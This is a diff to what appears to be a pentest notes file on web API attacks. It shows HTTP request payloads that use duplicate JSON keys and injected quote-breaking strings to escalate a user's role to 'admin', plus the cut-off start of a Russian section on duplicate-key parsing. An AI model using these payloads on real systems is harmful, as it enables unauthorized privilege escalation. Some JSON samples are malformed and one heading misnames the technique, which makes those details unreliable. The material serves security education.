@@ -1,8 +1,61 @@
+## Property pollution
+by [Dana Epp](https://danaepp.com/attacking-apis-by-tainting-data-in-weird-places)
+
+If an application sends to server partial updates like this
+```http
+PUT /api/user HTTP/1.1
+Content-Type: application/json
+
+{
+ "userName":"dana",
+ "pwd":"password"
+}
+```
+And you know there is also account property which is called `accountType` and can be equal either to `user` or `admin`. But the developer strips that field. The thing you can do is
+```http
+PUT /api/user HTTP/1.1
+Content-Type: application/json
+
+{
+ "accountType":"user",
+ "userName":"dana",
+ "pwd":"password",
+ "accountType":"admin"
+}
+```
+## Server side prototype pollution
+by [Dana Epp](https://danaepp.com/structured-format-injection)
+
+Imagine that you have found a web application with a user object containing id, name and role fields.
+
+While observing your traffic, you noticed a following request:
+```http
+POST /myprofile HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name=Dana
+```
+Even if you still cannot perform a mass assignment, it is possible to inject JSON values which would be included in the server-side request:
+````json
+name=Dana","role":"admin
+````
+which would result in `PUT /api/users/1234{"name"="Dana","role":"admin"}`.
+
+If your application API only supports the `application/json` content type, it is also worth trying:
+```http
+POST /myprofile HTTP/1.1
+Content-Type: application/json
+
+{"name"="Dana\",\"role\":\"admin"}
+```
+
+This is sometimes called **auto-binding**.
+## Standard diversity prototype pollution
 by [cybred](https://t.me/cybred)
 
 Возьмем небольшое приложение с двумя микросервисами:
-— Cart — реализует бизнес-логику корзины
-— Payment — используется для обработки платежей
+- Cart - реализует бизнес-логику корзины
+- Payment - используется для обработки платежей
 
 Cart написан на Python с Flask и принимает ID товаров с их количеством. Попробуем отправить в него запрос с двумя одинаковыми ключами:
 ```
